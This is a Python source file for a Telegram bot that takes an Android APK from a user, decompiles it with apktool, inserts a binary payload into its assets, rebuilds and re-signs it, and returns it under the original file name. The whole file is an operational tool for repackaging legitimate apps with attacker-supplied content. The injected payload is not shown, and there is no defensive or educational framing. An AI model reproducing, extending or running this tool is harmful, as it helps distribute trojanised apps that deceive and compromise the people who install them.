import os
import logging
import tempfile
import subprocess
from pathlib import Path
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, ContextTypes, filters

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

TOKEN = os.getenv("TELEGRAM_TOKEN", "").strip()

KEYSTORE_PATH = None
for path in ["/app/release.keystore", "./release.keystore"]:
    if os.path.exists(path):
        KEYSTORE_PATH = path
        break

KEYSTORE_PASS = os.getenv("KEYSTORE_PASS", "android").strip()

PAYLOAD = None
try:
    for path in ["/app/payload_data.bin", "./payload_data.bin"]:
        if os.path.exists(path) and os.path.getsize(path) > 0:
            with open(path, "rb") as f:
                PAYLOAD = f.read()
            logger.info(f"Payload loaded: {len(PAYLOAD)} bytes")
            break
    if not PAYLOAD:
        logger.error("Payload not found")
except Exception as e:
    logger.error(f"Error loading payload: {e}")


def run_cmd(cmd, label):
    logger.info(f"[{label}] Running: {' '.join(cmd)}")
    result = subprocess.run(cmd, capture_output=True, text=True)
    if result.returncode != 0:
        logger.error(f"[{label}] FAILED (code {result.returncode}): {result.stderr}")
        return False
    logger.info(f"[{label}] OK")
    return True


def inject_payload(apk_bytes):
    try:
        with tempfile.TemporaryDirectory() as tmpdir:
            tmp_path = Path(tmpdir)
            input_apk = tmp_path / "input.apk"
            unsigned_apk = tmp_path / "unsigned.apk"
            aligned_apk = tmp_path / "aligned.apk"
            signed_apk = tmp_path / "signed.apk"
            decompiled_dir = tmp_path / "decompiled"

            with open(input_apk, "wb") as f:
                f.write(apk_bytes)
            logger.info(f"APK written: {len(apk_bytes)} bytes")

            # STEP 1: Decompile (keep original resources untouched)
            logger.info("Decompiling APK...")
            if not run_cmd(
                ["apktool", "d", "-f", "-r", "-o", str(decompiled_dir), str(input_apk)],
                "decompile"
            ):
                return None

            # STEP 2: Inject payload into assets/
            payload_path = decompiled_dir / "assets" / "payload.bin"
            payload_path.parent.mkdir(parents=True, exist_ok=True)
            with open(payload_path, "wb") as f:
                f.write(PAYLOAD)
            logger.info(f"Payload injected: {payload_path} ({len(PAYLOAD)} bytes)")

            # STEP 3: Rebuild APK
            logger.info("Rebuilding APK...")
            if not run_cmd(
                ["apktool", "b", "-o", str(unsigned_apk), str(decompiled_dir)],
                "rebuild"
            ):
                return None

            if not unsigned_apk.exists():
                logger.error("Rebuilt APK not found")
                return None

            # STEP 4: Zipalign
            logger.info("Zipaligning APK...")
            if not run_cmd(
                ["zipalign", "-f", "4", str(unsigned_apk), str(aligned_apk)],
                "zipalign"
            ):
                # If zipalign fails, try without it (still better than nothing)
                logger.warning("Zipalign failed, signing without alignment")
                aligned_apk = unsigned_apk

            # STEP 5: Sign APK
            if KEYSTORE_PATH:
                logger.info("Signing APK...")
                if not run_cmd(
                    [
                        "apksigner", "sign",
                        "--ks", KEYSTORE_PATH,
                        "--ks-pass", f"pass:{KEYSTORE_PASS}",
                        "--key-pass", f"pass:{KEYSTORE_PASS}",
                        "--out", str(signed_apk),
                        str(aligned_apk),
                    ],
                    "sign"
                ):
                    return None

                if not signed_apk.exists():
                    logger.error("Signed APK not found")
                    return None

                with open(signed_apk, "rb") as f:
                    return f.read()
            else:
                logger.warning("No keystore found, returning unsigned APK")
                with open(aligned_apk, "rb") as f:
                    return f.read()

    except Exception as e:
        logger.error(f"Inject error: {e}", exc_info=True)
        return None


async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "APK Injector Bot\n\n"
        "Send an APK and I will inject the payload.\n\n"
        "Commands:\n"
        "/status - Check payload\n"
        "/help - Help"
    )


async def status(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if PAYLOAD:
        mb = len(PAYLOAD) // (1024 * 1024)
        await update.message.reply_text(f"Payload loaded: {mb} MB")
    else:
        await update.message.reply_text("No payload loaded!")


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "Help:\n\n"
        "/start - Start\n"
        "/status - Check payload\n"
        "/help - This message\n\n"
        "Send an APK file to inject the payload."
    )


async def handle_apk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not PAYLOAD:
        await update.message.reply_text("Payload not loaded!")
        return

    document = update.message.document
    if not document or not document.file_name.endswith(".apk"):
        await update.message.reply_text("Send a valid APK file!")
        return

    status_msg = await update.message.reply_text("Downloading APK...")

    try:
        file = await context.bot.get_file(document.file_id)
        apk_data = await file.download_as_bytearray()

        await status_msg.edit_text("Injecting payload... (may take a few minutes)")

        result = inject_payload(bytes(apk_data))

        if result:
            await update.message.reply_document(
                document=result,
                filename=document.file_name,
                caption="APK injected successfully!"
            )
        else:
            await status_msg.edit_text("Error injecting payload!")

    except Exception as e:
        logger.error(f"Error: {e}")
        await status_msg.edit_text(f"Error: {str(e)}")


def main():
    if not TOKEN:
        raise ValueError("TELEGRAM_TOKEN not set")

    logger.info(f"Token OK: {TOKEN[:10]}...")
    logger.info(f"Keystore: {KEYSTORE_PATH or 'NOT FOUND'}")

    app = Application.builder().token(TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("status", status))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_apk))

    logger.info("Bot started!")
    app.run_polling()


if __name__ == "__main__":
    main()
